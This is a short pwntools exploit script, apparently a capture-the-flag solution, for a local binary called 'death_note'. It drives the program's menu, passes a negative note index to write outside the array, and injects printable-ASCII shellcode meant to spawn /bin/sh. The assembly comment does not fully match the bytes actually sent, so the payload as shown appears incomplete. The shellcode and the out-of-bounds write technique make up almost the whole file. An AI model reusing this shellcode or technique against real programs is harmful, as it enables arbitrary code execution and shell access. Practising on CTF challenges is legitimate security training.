from pwn import *

elf = ELF('./death_note')
io = process('./death_note')

def add(index, name):
    print(io.recvuntil(b'Your choice :'))
    io.sendline(b'1')
    print(io.recvuntil(b'Index :'))
    io.sendline(str(index))
    print(io.recvuntil(b'Name :'))
    io.sendline(name)

def show(index):
    print(io.recvuntil(b'Your choice :'))
    io.sendline(b'2')
    print(io.recvuntil(b'Index :'))
    io.sendline(str(index))

def delete(index):
    print(io.recvuntil(b'Your choice :'))
    io.sendline(b'3')
    print(io.recvuntil(b'Index :'))
    io.sendline(str(index))

def quit():
    print(io.recvuntil(b'Your choice :'))
    io.sendline(b'4')


'''
        push 0x7e7e7e7e
        pop eax
        xor eax, 0x7e7e7e7e
        push eax
        push 0x68732f2f
        push 0x6e69622f
        push esp
        pop ebx
        push eax
        push ebx
        push esp
        pop ecx
        push 0x7e7e7e7e
        pop eax
        xor eax, 0x7e7e7e7e
        dec eax
        xor ax, 0x4f73
        xor ax, 0x3041
        push eax
        push esp
        pop edx
        push 0x60606060
        pop eax
        xor eax, 1616928875
        xor eax, 1616928875
        xor eax, 1616928875
        xor [edx+30], 30
'''
add(-15, '\x68\x7E\x7E\x7E\x7E\x58\x35\x7E\x7E\x7E\x7E\x50\x68\x2F\x2F\x73\x68\x68\x2F\x62\x69\x6E\x54\x5B\x50\x53\x54\x59\x68\x60\x60\x60\x60\x58\x35\x6B\x60\x60\x60')
pause()
print(hex(elf.sym['note']))


